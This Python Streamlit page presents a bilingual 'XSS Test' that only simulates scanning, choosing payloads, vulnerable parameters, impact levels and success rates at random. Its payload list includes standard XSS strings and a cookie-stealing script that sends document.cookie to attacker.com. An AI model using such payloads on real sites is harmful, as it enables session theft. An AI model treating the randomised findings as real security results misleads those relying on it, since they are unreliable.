import streamlit as st
import time
import random
import pandas as pd
import plotly.express as px
from datetime import datetime
from utils import init_language, COMMON_TRANSLATIONS

# Page config
st.set_page_config(
    page_title="XSS Test",
    page_icon="🔄",
    layout="wide"
)

# Page-specific translations
PAGE_TRANSLATIONS = {
    "en": {
        "page_title": "XSS (Cross-Site Scripting) Test",
        "description": """
This tool simulates XSS (Cross-Site Scripting) attacks to test web application security.
Test different types of XSS vulnerabilities:
- Reflected XSS
- Stored XSS
- DOM-based XSS
""",
        "xss_type": "XSS Type",
        "test_parameters": "Test Parameters",
        "test_scope": "Test Scope",
        "impact_level": "Impact Level",
        "affected_pages": "Affected Pages",
        "vulnerable_params": "Vulnerable Parameters",
        "security_filters": "Security Filters Detected",
        "no_filters": "No security filters detected",
        "successful_payloads": "Successful Payloads",
        "payload": "Payload",
        "success_rate": "Success Rate by Parameter",
        "no_payloads": "No successful XSS payloads found - target appears to be secure"
    },
    "et": {
        "page_title": "XSS (Skriptide Süstimine) Test",
        "description": """
See tööriist simuleerib XSS (Cross-Site Scripting) rünnakuid veebirakenduse turvalisuse testimiseks.
Testi erinevaid XSS haavatavusi:
- Peegeldatud XSS
- Salvestatud XSS
- DOM-põhine XSS
""",
        "xss_type": "XSS Tüüp",
        "test_parameters": "Testi Parameetrid",
        "test_scope": "Testi Ulatus",
        "impact_level": "Mõju Tase",
        "affected_pages": "Mõjutatud Lehed",
        "vulnerable_params": "Haavatavad Parameetrid",
        "security_filters": "Tuvastatud Turvafiltrid",
        "no_filters": "Turvafiltreid ei tuvastatud",
        "successful_payloads": "Edukad Päringud",
        "payload": "Päring",
        "success_rate": "Edukuse Määr Parameetrite Kaupa",
        "no_payloads": "Edukaid XSS päringuid ei leitud - sihtmärk tundub turvaline"
    }
}

# Initialize session state
if 'xss_history' not in st.session_state:
    st.session_state.xss_history = []

# Get current language and translations
lang = init_language()
texts = {**COMMON_TRANSLATIONS[lang], **PAGE_TRANSLATIONS[lang]}

def simulate_xss_test(target, xss_type, test_parameters):
    """Simulate XSS test"""
    time.sleep(1)
    
    # Sample payloads for different XSS types
    payloads = {
        "Reflected": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ],
        "Stored": [
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<img src=x onerror=fetch('/api/data')>",
            "<svg onload=alert('XSS')>"
        ],
        "DOM": [
            "javascript:eval('alert(1)')",
            "#<img src=x onerror=alert(1)>",
            "javascript:window['alert'](1)"
        ]
    }
    
    # Generate test results
    successful_payloads = random.sample(payloads[xss_type], random.randint(1, len(payloads[xss_type])))
    vulnerable_params = random.sample(test_parameters, random.randint(1, len(test_parameters)))
    
    return {
        "success": bool(successful_payloads),
        "payloads": successful_payloads,
        "vulnerable_parameters": vulnerable_params,
        "affected_pages": random.randint(1, 5),
        "impact": random.choice(["Low", "Medium", "High", "Critical"]),
        "filters_detected": random.choice([True, False]),
        "filter_types": ["HTML Encoding", "JavaScript Encoding"] if random.random() > 0.5 else []
    }

# UI Components
st.title(f"🔄 {texts['page_title']}")
st.markdown(texts['description'])

# Test Configuration
col1, col2 = st.columns(2)

with col1:
    target = st.text_input(texts['target_website'], "http://example.com")
    xss_type = st.selectbox(
        texts['xss_type'],
        ["Reflected", "Stored", "DOM"],
        index=0
    )

with col2:
    test_parameters = st.multiselect(
        texts['test_parameters'],
        ["comment", "search", "username", "title", "description", "message"],
        default=["comment", "search"]
    )
    
    test_scope = st.multiselect(
        texts['test_scope'],
        ["Forms", "URL Parameters", "Headers", "Cookies"],
        default=["Forms", "URL Parameters"]
    )

# Launch Test Button
if st.button(texts['start_scan']):
    with st.spinner(texts['scanning']):
        # Perform the test
        results = simulate_xss_test(target, xss_type, test_parameters)
        
        # Store in history
        st.session_state.xss_history.append({
            "timestamp": datetime.now(),
            "target": target,
            "xss_type": xss_type,
            "successful_payloads": len(results["payloads"]),
            "vulnerable_params": len(results["vulnerable_parameters"]),
            "impact": results["impact"]
        })
        
        # Display Results
        st.header(texts['scan_results'])
        
        col1, col2 = st.columns(2)
        
        with col1:
            st.subheader(texts['impact_level'])
            st.error(f"{results['impact']}")
            
            st.metric(texts['affected_pages'], results["affected_pages"])
            
            st.write(f"🎯 {texts['vulnerable_params']}:")
            for param in results["vulnerable_parameters"]:
                st.code(param)
            
            if results["filters_detected"]:
                st.warning(texts['security_filters'])
                for filter_type in results["filter_types"]:
                    st.write(f"• {filter_type}")
            else:
                st.success(texts['no_filters'])
        
        with col2:
            st.subheader(texts['successful_payloads'])
            
            if results["payloads"]:
                for i, payload in enumerate(results["payloads"], 1):
                    with st.expander(f"{texts['payload']} {i}"):
                        st.code(payload, language="html")
                        
                # Create visualization of payload success
                payload_data = pd.DataFrame({
                    "Parameter": results["vulnerable_parameters"],
                    "Success Rate": [random.uniform(0.6, 1.0) for _ in results["vulnerable_parameters"]]
                })
                
                fig = px.bar(payload_data,
                           x="Parameter",
                           y="Success Rate",
                           title=texts['success_rate'])
                st.plotly_chart(fig, use_container_width=True)
            else:
                st.success(texts['no_payloads'])

# Test History
st.header(texts['scan_history'])
if st.session_state.xss_history:
    history_df = pd.DataFrame(st.session_state.xss_history)
    st.dataframe(history_df, use_container_width=True)
    
    # History visualization
    fig = px.line(history_df, 
                  x='timestamp', 
                  y=['successful_payloads', 'vulnerable_params'],
                  title=texts['scan_history'])
    st.plotly_chart(fig, use_container_width=True)
else:
    st.info(texts['no_history']) 